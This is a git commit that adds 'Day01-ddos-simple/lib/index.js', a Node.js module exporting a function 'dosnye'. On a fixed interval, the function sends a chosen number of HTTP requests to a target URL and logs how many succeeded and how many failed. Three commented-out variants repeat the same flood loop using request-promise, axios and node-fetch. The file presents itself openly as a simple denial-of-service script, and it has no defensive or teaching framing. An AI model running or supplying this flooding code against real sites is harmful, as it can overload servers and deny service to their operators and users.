f7ba0b955e89ac14d5e6cccfaa9c8e6bcfc8d2ed
Kaze <101078139+KazeDevID@users.noreply.github.com>
2023-08-06 09:59:52 +0800

    Add files via upload

--- Day01-ddos-simple/lib/index.js
+++ Day01-ddos-simple/lib/index.js
@@ -1,1 +1,111 @@
+const req = require('request')
 
+const dosnye = (url, qty, ms) => {
+    let err = ok = 0
+
+    setInterval(_ => {
+
+        for (let i = qty; i--;)
+            req(url, error => !error ? ok++ : err++)
+
+        console.log(`result:' ${ ok } ${ err }`)
+
+        err = ok = 0
+
+    }, ms)
+}
+
+module.exports = dosnye
+
+// Variasi
+
+
+/* 1
+const request = require('request-promise');
+
+const dosnye = async (url, qty, ms) => {
+    let err = ok = 0;
+
+    setInterval(async () => {
+        for (let i = qty; i--;) {
+            try {
+                await request(url);
+                ok++;
+            } catch (error) {
+                err++;
+            }
+        }
+
+        console.log(`result: ${ok} ${err}`);
+
+        err = ok = 0;
+    }, ms);
+};
+
+module.exports = dosnye;
+
+
+
+
+
+
+
+
+
+
+2
+
+const axios = require('axios');
+
+const dosnye = (url, qty, ms) => {
+    let err = ok = 0;
+
+    setInterval(async () => {
+        for (let i = qty; i--;) {
+            try {
+                await axios.get(url);
+                ok++;
+            } catch (error) {
+                err++;
+            }
+        }
+
+        console.log(`result: ${ok} ${err}`);
+
+        err = ok = 0;
+    }, ms);
+};
+
+module.exports = dosnye;
+
+
+
+
+
+3
+
+const fetch = require('node-fetch');
+
+const dosnye = (url, qty, ms) => {
+    let err = ok = 0;
+
+    setInterval(async () => {
+        for (let i = qty; i--;) {
+            try {
+                await fetch(url);
+                ok++;
+            } catch (error) {
+                err++;
+            }
+        }
+
+        console.log(`result: ${ok} ${err}`);
+
+        err = ok = 0;
+    }, ms);
+};
+
+module.exports = dosnye;
+
+
+*/
